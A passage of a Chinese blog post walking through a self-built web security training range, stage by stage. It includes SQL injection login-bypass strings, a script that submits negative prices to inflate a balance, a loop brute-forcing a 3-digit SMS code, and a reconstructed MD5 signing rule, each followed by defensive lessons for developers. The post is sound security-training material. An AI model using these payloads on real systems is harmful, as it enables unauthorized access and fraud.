id=\"2-界面-7\"><a href=\"#2-界面-7\" class=\"headerlink\" title=\"2. 界面\"></a>2. 界面</h3><p>界面如下图所示：<br>![关卡8]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_35.png\" target=\"_blank\" rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_35.png</a>)<br>![关卡8]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_35.png\" target=\"_blank\" rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_35.png</a>)</p>\n<h3 id=\"3-揭密-7\"><a href=\"#3-揭密-7\" class=\"headerlink\" title=\"3. 揭密\"></a>3. 揭密</h3><p>第8关上来就是一个大大的二维码。<br>通过二维码反解工具，得到一个网址：<a href=\"http://10.4.236.115:8080/sohu/stage7?level=7&amp;username=yeshaoting&amp;time=1457452800&amp;verify=c6ce17b02eb15fd1831267a8736bd933。\" target=\"_blank\" rel=\"external\">http://10.4.236.115:8080/sohu/stage7?level=7&amp;username=yeshaoting&amp;time=1457452800&amp;verify=c6ce17b02eb15fd1831267a8736bd933。</a></p>\n<p>由于我们第7关已经过关，因此这个url还需要变通一下。修改后完成的url为：<a href=\"http://10.4.236.115:8080/sohu/stage8?level=8&amp;username=yeshaoting&amp;time=1457452800&amp;verify=c6ce17b02eb15fd1831267a8736bd933。\" target=\"_blank\" rel=\"external\">http://10.4.236.115:8080/sohu/stage8?level=8&amp;username=yeshaoting&amp;time=1457452800&amp;verify=c6ce17b02eb15fd1831267a8736bd933。</a></p>\n<p>直接提示：”这是一次已经过期的提交，请在2分钟内完成请求提交。”<br>由此可见，参数time不在2分钟内。反查查秒级时间得到内容为：2016-03-09 00:00:00，确认不是当时时间2分钟内。</p>\n<p>修改time内容为当前时间后再提交，提示：”请求在服务器端验证失败。”。<br>可以猜测，参数verify不对。这个verfiy一看就是经过md5加密的。</p>\n<p>根据开发时与第三方接口对接的经验，verfiy是通过前面几个参数按照某种规则生成的。<br>如是，依次尝试主流的微信、腾讯、淘宝开放平台，最终发现与腾讯开放平台的签名规则相似。</p>\n<p>第1步：将level、username、time三个参数进行字典序排序。<br>第2步：将第1步中排序后的参数(key=value)用&amp;拼接起来：level=8&amp;time=1457452800&amp;username=yeshaoting。<br>第3步：对第2步内容进行md5加密，得到verfity值。</p>\n<h3 id=\"4-补充知识：签名规则\"><a href=\"#4-补充知识：签名规则\" class=\"headerlink\" title=\"4. 补充知识：签名规则\"></a>4. 补充知识：签名规则</h3><h4 id=\"微信开放平台\"><a href=\"#微信开放平台\" class=\"headerlink\" title=\"微信开放平台\"></a>微信开放平台</h4><p>参见：<a href=\"http://mp.weixin.qq.com/wiki?t=resource/res_main&amp;id=mp1421135319&amp;token=&amp;lang=zh_CN\" target=\"_blank\" rel=\"external\">微信签名规则</a><br>![关卡8-微信签名规则]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_31.png\" target=\"_blank\" rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_31.png</a>)<br>![关卡8-微信签名规则]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_31.png\" target=\"_blank\" rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_31.png</a>)</p>\n<h4 id=\"腾讯开放平台\"><a href=\"#腾讯开放平台\" class=\"headerlink\" title=\"腾讯开放平台\"></a>腾讯开放平台</h4><p>参见：<a href=\"http://wiki.open.qq.com/wiki/%E8%85%BE%E8%AE%AF%E5%BC%80%E6%94%BE%E5%B9%B3%E5%8F%B0%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%94%E7%94%A8%E7%AD%BE%E5%90%8D%E5%8F%82%E6%95%B0sig%E7%9A%84%E8%AF%B4%E6%98%8E\" target=\"_blank\" rel=\"external\">腾讯签名规则</a><br>![关卡8-腾讯签名规则]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_33.png\" target=\"_blank\" rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_33.png</a>)<br>![关卡8-腾讯签名规则]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_33.png\" target=\"_blank\" rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_33.png</a>)</p>\n<h4 id=\"淘宝开放平台\"><a href=\"#淘宝开放平台\" class=\"headerlink\" title=\"淘宝开放平台\"></a>淘宝开放平台</h4><p>参见：<a href=\"http://open.taobao.com/doc2/detail.htm?articleId=101617&amp;docType=1&amp;treeId=1#s5\" target=\"_blank\" rel=\"external\">淘宝签名规则</a><br>![关卡8-淘宝签名规则]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_34.png\" target=\"_blank\" rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_34.png</a>)<br>![关卡8-淘宝签名规则]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_34.png\" target=\"_blank\" rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_34.png</a>)</p>\n<h3 id=\"5-小结-1\"><a href=\"#5-小结-1\" class=\"headerlink\" title=\"5. 小结\"></a>5. 小结</h3><p>签名方式尽量与市面上的一些规则区分开。<br>签名规则也是有可能会被猜出，可以通过一些别的类似于关卡5小结里的限制来辅助提高安全性。</p>\n","excerpt":"<p><img src=\"/asserts/images/logo/hack.png\" class=\"img-logo img-center\" /></p>\n<p>WEB安全渗透靶场：<a href=\"http://10.4.236.115:8080/\">http://10.4.236.115:8080/</a><br>是否开放所有关卡切换：<a href=\"http://10.4.236.115:8080/sohu/switchOpenStage\">http://10.4.236.115:8080/sohu/switchOpenStage</a></p>\n<h2 id=\"0x00-前言\"><a href=\"#0x00-前言\" class=\"headerlink\" title=\"0x00 前言\"></a>0x00 前言</h2><p>此次分享内容旨在加深开发工作中的安全意识，也希望能起到抛砖引玉的作用，在分享完成后的讨论环节大家也说说自己现在或者曾经遇到过的安全问题。</p>\n<p>为了让大家能参与其中，对WEB安全问题有个更具象的认识。周末二天基于 <code>angularjs</code>、<code>jquery</code>、<code>spring</code>、<code>spring mvc</code>、<code>mybatis</code>、<code>mysql</code> 搭建一个比较粗糙的WEB安全靶场，复刻自参加的第一屇搜狐安全擂台赛，供大家hack。<br>如发现问题，请各位见谅哈。</p>\n<h3 id=\"1-用户登记\"><a href=\"#1-用户登记\" class=\"headerlink\" title=\"1. 用户登记\"></a>1. 用户登记</h3><p>主要是为了收集用户名信息，进行登记，用于记录闯关进度!</p>\n<p>界面如下图所示：<br>![用户登记]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_1.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_1.png</a>)<br>![用户登记]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_1.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_1.png</a>)</p>\n<h3 id=\"2-用户主页\"><a href=\"#2-用户主页\" class=\"headerlink\" title=\"2. 用户主页\"></a>2. 用户主页</h3><p>简单地展示用户当前进度，并提供进入下一关的入口。后续可以扩展，显示击败百分之多少的对手。</p>\n<p>界面如下图所示：<br>![用户主页]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_3.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_3.png</a>)<br>![用户主页]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_3.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_3.png</a>)</p>","more":"<h2 id=\"0x01-关卡1\"><a href=\"#0x01-关卡1\" class=\"headerlink\" title=\"0x01 关卡1\"></a>0x01 关卡1</h2><p>属于热身题，纯属练手，引导用户在之后的关卡中找到更多破解信息。</p>\n<h3 id=\"1-提示\"><a href=\"#1-提示\" class=\"headerlink\" title=\"1. 提示\"></a>1. 提示</h3><p>提示如下：</p>\n<blockquote>\n<p>任务目标：找出正确的用户名与密码并通过验证。<br>Tips：这个页面用户与密码不需要去服务器交互验证。</p>\n</blockquote>\n<h3 id=\"2-界面\"><a href=\"#2-界面\" class=\"headerlink\" title=\"2. 界面\"></a>2. 界面</h3><p>界面如下图所示：<br>![关卡1]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_4.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_4.png</a>)<br>![关卡1]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_4.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_4.png</a>)</p>\n<h3 id=\"3-揭密\"><a href=\"#3-揭密\" class=\"headerlink\" title=\"3. 揭密\"></a>3. 揭密</h3><p>用户名密码直接写在了页面的js逻辑里，跟随页面元素js操作即可找到对应的内容。<br>![关卡1-页面代码]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_5.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_5.png</a>)<br>![关卡1-页面代码]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_5.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_5.png</a>)<br>![关卡1-js代码]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_6.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_6.png</a>)<br>![关卡1-js代码]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_6.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_6.png</a>)</p>\n<p>由此，可见第一关的用户名密码如下：<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">var</span> stage1Username = <span class=\"string\">\"stage1_user\"</span>;</div><div class=\"line\"><span class=\"keyword\">var</span> state1Password = <span class=\"string\">\"tHis1Is3aSim3p#ab$\"</span>;</div></pre></td></tr></table></figure></p>\n<h3 id=\"4-小结\"><a href=\"#4-小结\" class=\"headerlink\" title=\"4. 小结\"></a>4. 小结</h3><p>一般不会出现此类小白程序员的情况。</p>\n<h2 id=\"0x02-关卡2\"><a href=\"#0x02-关卡2\" class=\"headerlink\" title=\"0x02 关卡2\"></a>0x02 关卡2</h2><p>这是一道SQL注入题。</p>\n<p>SQL注入攻击（SQL Injection），简称注入攻击，是Web开发中最常见的一种安全漏洞。可以用它来从数据库获取敏感信息，或者利用数据库的特性执行添加用户，导出文件等一系列恶意操作，甚至有可能获取数据库乃至系统用户最高权限。</p>\n<h3 id=\"1-提示-1\"><a href=\"#1-提示-1\" class=\"headerlink\" title=\"1. 提示\"></a>1. 提示</h3><p>提示如下：</p>\n<blockquote>\n<p>任务目标：本题没有可登入的用户名密码，请绕过登录验证。<br>Tips：就算是判断了用户名 and 密码 都正确，也是被禁用的。</p>\n</blockquote>\n<h3 id=\"2-界面-1\"><a href=\"#2-界面-1\" class=\"headerlink\" title=\"2. 界面\"></a>2. 界面</h3><p>界面如下图所示：<br>![关卡2]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_7.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_7.png</a>)<br>![关卡2]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_7.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_7.png</a>)</p>\n<h3 id=\"3-揭密-1\"><a href=\"#3-揭密-1\" class=\"headerlink\" title=\"3. 揭密\"></a>3. 揭密</h3><p>对于sql而言，有些特殊字符（如：单引号，–，\\，#等）、保留字（如：select，values，delete等）和内置函数（date，time，concat等），使用不当都有可能会导致SQL执行错误。</p>\n<p>由此，我们尝试使用单引号，发现登录异常提示如下：<br>![特殊字符注入]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_12.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_12.png</a>)<br>![特殊字符注入]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_12.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_12.png</a>)</p>\n<p>并且，发现在控制台出现如下异常信息：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">StatementCallback; bad SQL grammar [select count(id) from user2 <span class=\"built_in\">where</span> username = <span class=\"string\">''</span><span class=\"string\">' and password = '</span><span class=\"string\">']; nested exception is com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '</span><span class=\"string\">''</span><span class=\"string\">' and password = '</span><span class=\"string\">''</span> at line 1</div></pre></td></tr></table></figure></p>\n<p>从异常内容可以发现，出错的SQL内容为：<br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">select</span> <span class=\"keyword\">count</span>(<span class=\"keyword\">id</span>) <span class=\"keyword\">from</span> user2 <span class=\"keyword\">where</span> username = <span class=\"string\">''' and password = ''</span></div></pre></td></tr></table></figure></p>\n<p>于是乎就从盲目地注入，变成了有针对性的注入。<br>针对于此，可以填写如下内容进入SQL注入：<br><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div></pre></td><td class=\"code\"><pre><div class=\"line\">username: \\</div><div class=\"line\">password: or '' = '</div><div class=\"line\"></div><div class=\"line\">username: \\</div><div class=\"line\">password: or 1 != '</div><div class=\"line\"></div><div class=\"line\">username: ' or 1 !=</div><div class=\"line\">password: '--</div><div class=\"line\"></div><div class=\"line\">username: ' or 1 !=</div><div class=\"line\">password: '--</div><div class=\"line\"></div><div class=\"line\">username: ' or 1=1 -- x</div><div class=\"line\">username: ' or 1=1 #</div></pre></td></tr></table></figure></p>\n<p><strong>注</strong>：答案可以很多。</p>\n<h3 id=\"4-小结-1\"><a href=\"#4-小结-1\" class=\"headerlink\" title=\"4. 小结\"></a>4. 小结</h3><ul>\n<li>避免出现一些详细的错误消息，异常不要抛出来，在服务器端打印日志用于异常分析就好。</li>\n<li>永远不要使用动态拼装sql，使用数据库或开发框架提供的参数化查询接口。</li>\n<li>机密信息不要直接存放，加密或者hash密码和敏感的信息再存储。</li>\n<li>用户输入过滤：对特殊字符单引号和双”-“等进行转义处理或编码转换。</li>\n<li>SQL注入检测工具进行检测。如：sqlmap、SQLninja等。</li>\n</ul>\n<h3 id=\"5-参考文档\"><a href=\"#5-参考文档\" class=\"headerlink\" title=\"5. 参考文档\"></a>5. 参考文档</h3><ul>\n<li><a href=\"http://php.net/manual/zh/security.database.sql-injection.php\">SQL 注入</a></li>\n<li><a href=\"http://baike.baidu.com/view/3896.htm#3\">SQL注入技术</a></li>\n<li><a href=\"https://github.com/astaxie/build-web-application-with-golang/blob/master/zh/09.4.md\">9.4 避免SQL注入</a></li>\n</ul>\n<h2 id=\"0x03-关卡3\"><a href=\"#0x03-关卡3\" class=\"headerlink\" title=\"0x03 关卡3\"></a>0x03 关卡3</h2><h3 id=\"1-提示-2\"><a href=\"#1-提示-2\" class=\"headerlink\" title=\"1. 提示\"></a>1. 提示</h3><p>提示如下：</p>\n<blockquote>\n<p>任务目标：找到通关后台，并将自己的通关数目加一级<br>Tips：答案不在本页</p>\n</blockquote>\n<h3 id=\"2-界面-2\"><a href=\"#2-界面-2\" class=\"headerlink\" title=\"2. 界面\"></a>2. 界面</h3><p>界面如下图所示：<br>![关卡3]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_13.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_13.png</a>)<br>![关卡3]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_13.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_13.png</a>)</p>\n<h3 id=\"3-揭密-2\"><a href=\"#3-揭密-2\" class=\"headerlink\" title=\"3. 揭密\"></a>3. 揭密</h3><p>由提示找到通关后台可知，找到后台是关键。<br>一般地，常规后台命名为admin、admin\\index、manage、dashboard等。</p>\n<p>尝试如下地址：<a href=\"http://localhost:8080/sohu/index#/admin\">http://localhost:8080/sohu/index#/admin</a><br>于是进入了后台管理界面，如下图所示：<br>![WEB安全渗透实战-后台管理系统<br>]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_15.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_15.png</a>)<br>]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_15.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_15.png</a>)<br>![后台管理系统-升级]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_16.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_16.png</a>)<br>![后台管理系统-升级]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_16.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_16.png</a>)</p>\n<p>尝试点击<strong>升级</strong>直接通关，其他所有内容其实都是假的。</p>\n<h3 id=\"4-小结-2\"><a href=\"#4-小结-2\" class=\"headerlink\" title=\"4. 小结\"></a>4. 小结</h3><p>后台弱口令</p>\n<h2 id=\"0x04-关卡4\"><a href=\"#0x04-关卡4\" class=\"headerlink\" title=\"0x04 关卡4\"></a>0x04 关卡4</h2><p>将非最高价格物品价格修改为负值，从而增加自己的虚拟货币，然后再买最高价格物品。</p>\n<h3 id=\"1-提示-3\"><a href=\"#1-提示-3\" class=\"headerlink\" title=\"1. 提示\"></a>1. 提示</h3><p>提示如下：</p>\n<blockquote>\n<p>任务目标：通过本页面提供的虚拟货币购买价值最高的物品<br>Tips：0 - (-1) = 1</p>\n</blockquote>\n<h3 id=\"2-界面-3\"><a href=\"#2-界面-3\" class=\"headerlink\" title=\"2. 界面\"></a>2. 界面</h3><p>界面如下图所示：<br>![关卡4]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_21.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_21.png</a>)<br>![关卡4]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_21.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_21.png</a>)</p>\n<h3 id=\"3-揭密-3\"><a href=\"#3-揭密-3\" class=\"headerlink\" title=\"3. 揭密\"></a>3. 揭密</h3><p>由于初始时每人只拥有5000000的虚拟货币，完全不只以购买价值最高的物品。<br>因为要购买前需要增加自己的虚拟货币。</p>\n<p>再根据下面的提示说0 - (-1) = 1，可与购买联想到：购买物品时，修改传到后端的价格为负数，来达到为自己增加虚拟货币的目的。</p>\n<p>于是我们尝试购买价格为399的物品。系统提示：购买成功，但是未购买价值最高的物品，如下图所示：<br>![未购买最高价值的物品]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_22.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_22.png</a>)<br>![未购买最高价值的物品]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_22.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_22.png</a>)</p>\n<p>我们再通过console可以看到，发出的POST请求为：<a href=\"http://10.4.236.115:8080/sohu/stage4/pass?id=1&amp;price=399\">http://10.4.236.115:8080/sohu/stage4/pass?id=1&amp;price=399</a></p>\n<p>查看购买的js请求代码如下：<br>![关卡4-js代码]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_23.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_23.png</a>)<br>![关卡4-js代码]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_23.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_23.png</a>)</p>\n<p>在下一次购买请求时，设置price值为 -7999999 。请求完成后，依然提示购买失败的消息，但是虚拟货币却变成了：12999600。</p>\n<p>于是，我们就可以开开心心地购买最高价格的物品了。</p>\n<p>完成的js操作如下所示：<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">// 增加虚拟货币</span></div><div class=\"line\"><span class=\"keyword\">var</span> url = <span class=\"string\">'http://10.4.236.115:8080/sohu/stage4/pass?id=1&amp;price=-7999999'</span>;</div><div class=\"line\">$.ajax(&#123;</div><div class=\"line\">    method: <span class=\"string\">'post'</span>,</div><div class=\"line\">    <span class=\"keyword\">async</span>: <span class=\"literal\">false</span>,</div><div class=\"line\">    url: url,</div><div class=\"line\">    success: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">data</span>) </span>&#123;</div><div class=\"line\">        <span class=\"keyword\">if</span> (data.status == <span class=\"number\">200</span>) &#123;</div><div class=\"line\">            <span class=\"built_in\">console</span>.log(<span class=\"string\">'SUCCESS'</span>);</div><div class=\"line\">        &#125;</div><div class=\"line\">    &#125;</div><div class=\"line\">&#125;);</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// 购买最高价格物品</span></div><div class=\"line\"><span class=\"keyword\">var</span> url = <span class=\"string\">'http://10.4.236.115:8080/sohu/stage4/pass?id=3&amp;price=7999999'</span>;</div><div class=\"line\">$.ajax(&#123;</div><div class=\"line\">    method: <span class=\"string\">'post'</span>,</div><div class=\"line\">    <span class=\"keyword\">async</span>: <span class=\"literal\">false</span>,</div><div class=\"line\">    url: url,</div><div class=\"line\">    success: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">data</span>) </span>&#123;</div><div class=\"line\">        <span class=\"keyword\">if</span> (data.status == <span class=\"number\">200</span>) &#123;</div><div class=\"line\">            <span class=\"built_in\">console</span>.log(<span class=\"string\">'SUCCESS'</span>);</div><div class=\"line\">        &#125;</div><div class=\"line\">    &#125;</div><div class=\"line\">&#125;);</div></pre></td></tr></table></figure></p>\n<h3 id=\"4-小结-3\"><a href=\"#4-小结-3\" class=\"headerlink\" title=\"4. 小结\"></a>4. 小结</h3><p>虽然做了不能够买比自己持有总金额高的物品的检验，但是未校验物品金额不允许为负数，也未校验id对应的物品金额与实际金额是否相符。<br>对于关键逻辑，对参数做更加严格的校验。</p>\n<h2 id=\"0x05-关卡5\"><a href=\"#0x05-关卡5\" class=\"headerlink\" title=\"0x05 关卡5\"></a>0x05 关卡5</h2><p>暴力破解</p>\n<h3 id=\"1-提示-4\"><a href=\"#1-提示-4\" class=\"headerlink\" title=\"1. 提示\"></a>1. 提示</h3><p>提示如下：</p>\n<blockquote>\n<p>任务目标：通过收到的短信验证码完成手机验证。<br>Tips：有时候采用最原始的方法收到的效果反而更显著。</p>\n</blockquote>\n<h3 id=\"2-界面-4\"><a href=\"#2-界面-4\" class=\"headerlink\" title=\"2. 界面\"></a>2. 界面</h3><p>界面如下图所示：<br>![关卡5]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_24.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_24.png</a>)<br>![关卡5]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_24.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_24.png</a>)</p>\n<h3 id=\"3-揭密-4\"><a href=\"#3-揭密-4\" class=\"headerlink\" title=\"3. 揭密\"></a>3. 揭密</h3><p>从Tips里提到的最原始的方法，大概能猜测到最直接的破解方式：<strong>字典破解</strong> 或 <strong>暴力破解</strong>。<br>要么验证码是个弱密码，要么验证码很方便枚举出来。</p>\n<p>接下来，点击“获取短信验证码”，提示：新的3位数字验证码已经通过短信，发送到13800138000的手机上，请注意查收！<br>因此，可见验证码可以枚举出来，只需要发起不超过1000次请求即可找到验证码。</p>\n<p>看过js请求代码，了解请求构造后，可以使用如下操作暴破：<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">var</span> url = <span class=\"string\">'http://10.4.236.115:8080/sohu/sms/code/verfiy'</span>;</div><div class=\"line\"><span class=\"keyword\">var</span> len = <span class=\"number\">1000</span>;</div><div class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; len; i++) &#123;</div><div class=\"line\">\t$.ajax(&#123;</div><div class=\"line\">\t\tmethod: <span class=\"string\">'post'</span>,</div><div class=\"line\">        <span class=\"keyword\">async</span>: <span class=\"literal\">false</span>,</div><div class=\"line\">\t\turl: url + <span class=\"string\">'?phone=13800138000&amp;code='</span> + i,</div><div class=\"line\">\t\tsuccess: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">data</span>) </span>&#123;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (data.status == <span class=\"number\">200</span>) &#123;</div><div class=\"line\">\t\t\t\t<span class=\"built_in\">console</span>.log(<span class=\"string\">'code:'</span> + i);</div><div class=\"line\">\t\t\t\ti = len;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;);</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>暴破完成后，会打印出对应的验证码，之后即可通过dashboard页直接进入下一关。</p>\n<p><strong>注</strong>：考虑验证码可能会补扩散开，因此每次有人过关，验证码就会重新刷新一次。</p>\n<h3 id=\"4-小结-4\"><a href=\"#4-小结-4\" class=\"headerlink\" title=\"4. 小结\"></a>4. 小结</h3><p>尽量不要设置容易枚举的密码或验证码。同时，对于敏感信息可以加上一些限制，类似于：时效性限制或者一天内允许尝试失败次数等。</p>\n<h2 id=\"0x06-关卡6\"><a href=\"#0x06-关卡6\" class=\"headerlink\" title=\"0x06 关卡6\"></a>0x06 关卡6</h2><p>读取服务器上的文件</p>\n<h3 id=\"1-提示-5\"><a href=\"#1-提示-5\" class=\"headerlink\" title=\"1. 提示\"></a>1. 提示</h3><p>提示如下：</p>\n<blockquote>\n<p>任务目标：找到可以通过本关的密码并提交。<br>Tips：密码被硬编码到了当前页面服务器上的php代码里。</p>\n</blockquote>\n<h3 id=\"2-界面-5\"><a href=\"#2-界面-5\" class=\"headerlink\" title=\"2. 界面\"></a>2. 界面</h3><p>界面如下图所示：<br>![关卡6]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_25.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_25.png</a>)<br>![关卡6]<a 